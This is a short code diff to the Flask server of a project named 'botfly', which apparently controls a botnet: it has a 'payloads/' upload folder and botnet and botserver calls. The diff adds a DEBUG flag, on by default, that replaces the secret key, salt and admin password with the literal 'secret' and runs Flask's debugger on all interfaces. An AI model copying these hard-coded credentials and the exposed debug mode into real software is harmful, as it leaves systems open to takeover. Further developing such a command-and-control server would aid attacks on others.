@@ -27,6 +27,7 @@ eventlet.monkey_patch()
 
  To run: python server.py'''
 
+DEBUG = True
 HOSTNAME = 'botfly'
 BASEDIR = os.path.abspath(os.path.dirname(__file__))
 UPLOAD_FOLDER = 'payloads/'
@@ -39,8 +40,8 @@ async_mode = None
 
 app = flask.Flask(__name__)
 app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
-app.config['SECRET_KEY'] = os.environ['SECRET_KEY']
-app.config['SECURITY_PASSWORD_SALT'] = os.environ['SECRET_SALT']
+app.config['SECRET_KEY'] = 'secret' if DEBUG else os.environ['SECRET_KEY']
+app.config['SECURITY_PASSWORD_SALT'] = 'secret' if DEBUG else os.environ['SECRET_SALT']
 
 DB_LOC = 'test.db'
 app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///' +  os.path.join(BASEDIR, DB_LOC)
@@ -60,7 +61,7 @@ thread = None
 def recreate_test_databases(engine=None, session=None):
     db.create_all()
     if not User.query.filter_by(uname='admin').first():
-        UserManager.create_user('admin', 'fake@email.com', os.environ['ADMIN_PASS'])
+        UserManager.create_user('admin', 'fake@email.com', 'secret' if DEBUG else os.environ['ADMIN_PASS'])
     botnet.checkDB()
 
 # Login stuff
@@ -457,6 +458,6 @@ def main():
     botserver.start()
 
     if USE_SSL_FLASK:
-        socketio.run(app, debug=True, use_reloader=False, certfile=CERT_FILE, keyfile=KEY_FILE, port=1111, host='0.0.0.0')
+        socketio.run(app, debug=DEBUG, use_reloader=False, certfile=CERT_FILE, keyfile=KEY_FILE, port=1111, host='0.0.0.0')
     else:
-        socketio.run(app, debug=True, use_reloader=False, port=1111, host='0.0.0.0')
+        socketio.run(app, debug=DEBUG, use_reloader=False, port=1111, host='0.0.0.0')
